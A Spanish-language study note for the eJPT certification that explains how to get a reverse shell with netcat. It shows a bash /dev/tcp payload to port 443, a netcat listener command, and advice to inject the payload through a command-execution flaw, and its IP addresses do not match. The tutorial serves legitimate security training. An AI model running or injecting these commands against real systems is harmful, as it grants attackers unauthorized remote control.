
---
- TAG: #Introducción #hacking #basico #ReverShell #Netcat 
---
## Utilización de Netcat para el eJPT

En este apartado, vamos a hablar sobre un tema crucial para aprobar el examen eJPT: la utilización de netcat para establecer conexiones desde una máquina víctima hasta nuestra máquina atacante.

### Estableciendo Conexiones con Netcat

Para empezar, necesitaremos tener instalada nuestra máquina víctima, que puede ser cualquier distribución de Linux como Linux Mint, Kali Linux, Ubuntu, etc. Netcat nos permite establecer conectividad desde la máquina víctima a nuestra máquina atacante de manera eficiente.

#### Paso 1: Identificar la Dirección IP de la Máquina Atacante

Lo primero que debemos hacer es averiguar la dirección IP de nuestra máquina atacante. Esto lo logramos utilizando el comando `ifconfig` en la terminal:

```bash
ifconfig
```

#### Paso 2: Utilizar RevShells para Crear el Payload

Una herramienta útil para este proceso es [RevShells](https://www.revshells.com/). Esta página nos permite generar un payload para establecer una reverse shell.

1. **Seleccionar Bash -I**: En la página de RevShells, seleccionamos la opción `Bash -I`.
2. **Ingresar la Dirección IP y Puerto**: Ingresamos la dirección IP de nuestra máquina atacante y un puerto. Un puerto comúnmente utilizado es el `443`.

#### Paso 3: Generar y Ejecutar el Payload

El payload generado tendrá un aspecto similar a este:

```bash
sh -i >& /dev/tcp/1.2.3.4/443 0>&1
```

Donde `192.168.100.42` es la dirección IP de nuestra máquina atacante y `443` es el puerto.

#### Paso 4: Configurar Netcat en la Máquina Atacante

Antes de ejecutar el payload en la máquina víctima, debemos configurar nuestra máquina atacante para escuchar en el puerto especificado (en este caso, `443`). Utilizamos el siguiente comando en la terminal de la máquina atacante:

```bash
sudo nc -lvnp 443
```

#### Paso 5: Ejecutar el Payload en la Máquina Víctima

Una vez que nuestra máquina atacante está lista y escuchando, ejecutamos el payload en la máquina víctima. Esto se puede hacer directamente en la terminal de la víctima.

Si todo está configurado correctamente, recibirás una conexión en tu máquina atacante, estableciendo una reverse shell.

### Importancia de Netcat en la Explotación de Vulnerabilidades

La utilización de netcat es fundamental cuando explotamos vulnerabilidades y conseguimos ejecución remota de comandos. Si logramos inyectar un comando como el payload mencionado en la máquina víctima, obtendremos acceso remoto a dicha máquina, permitiéndonos realizar diversas acciones de pentesting.
